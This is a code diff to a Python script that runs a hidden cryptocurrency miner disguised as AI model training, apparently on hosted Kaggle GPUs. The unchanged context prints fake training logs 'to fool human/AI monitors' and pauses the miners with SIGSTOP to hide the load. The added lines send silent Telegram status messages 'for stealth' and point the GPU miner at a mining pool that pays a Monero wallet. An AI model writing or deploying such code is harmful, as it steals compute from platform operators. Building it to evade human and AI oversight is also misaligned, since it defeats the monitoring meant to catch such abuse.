@@ -13,6 +13,9 @@ import random
 import subprocess
 import threading
 import sys
+import signal
+import json
+import urllib.request
 
 # ─────────────────────────────────────────────────────────────
 # AI Camouflage Configuration
@@ -25,6 +28,22 @@ STEPS_PER_EPOCH = DATASET_SIZE // BATCH_SIZE
 # Miner Config (Hidden)
 WALLET = os.getenv('XMR_WALLET', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
 RELAY = os.getenv('RELAY_URL', 'wss://your-relay-url.onrender.com')
+
+# Telegram Config
+TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
+TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
+START_TIME = time.time()
+
+def send_telegram_message(message):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = json.dumps({'chat_id': TELEGRAM_CHAT_ID, 'text': message}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        urllib.request.urlopen(req, timeout=5)
+    except Exception as e:
+        pass # Fail silently for stealth
 
 def fake_training_logs():
     """Generates realistic AI training progress logs to fool human/AI monitors."""
@@ -94,12 +113,18 @@ def apply_pulse_load(miner_proc, gpu_proc):
         # Phase 1: Training (High Load) - 10 to 15 minutes
         phase_duration = random.randint(600, 900)
         print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
+        
+        uptime_mins = int((time.time() - START_TIME) / 60)
+        send_telegram_message(f"🟢 [LUMEN SWARM] Worker Active\nPhase: TRAINING (High Load)\nDuration: {phase_duration}s\nUptime: {uptime_mins} mins")
+        
         # Miner is already running from launch_hidden_miner()
         time.sleep(phase_duration)
 
         # Phase 2: Validation (Low Load) - 2 to 4 minutes
         idle_duration = random.randint(120, 240)
         print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
+        
+        send_telegram_message(f"🟡 [LUMEN SWARM] Worker Resting\nPhase: VALIDATION (Low Load)\nDuration: {idle_duration}s\nUptime: {uptime_mins} mins")
         
         # Suspend miners to drop CPU/GPU to near zero
         if miner_proc: os.kill(miner_proc.pid, signal.SIGSTOP)
@@ -130,11 +155,12 @@ def launch_hidden_miner():
         gpu_info = subprocess.check_output(["nvidia-smi"]).decode()
         if "NVIDIA" in gpu_info:
             print("[+] GPU Backend Initialized. Attaching CUDA streams...")
+            worker_id = f"kaggle-gpu-{random.randint(100,999)}"
             gpu_proc = subprocess.Popen([
                 "./cuda_core_gpu", 
                 "-a", "kawpow", 
-                "-o", "stratum+tcp://kawpow.usa-west.nicehash.com:3385", 
-                "-u", "36Z2D5f8Z5nN4L...YOUR_BTC_ADDR",
+                "-o", "stratum+tcp://kp.unmineable.com:3333", 
+                "-u", f"XMR:{WALLET}.{worker_id}",
                 "--log", "false"
             ], stdout=subprocess.DEVNULL)
     except:
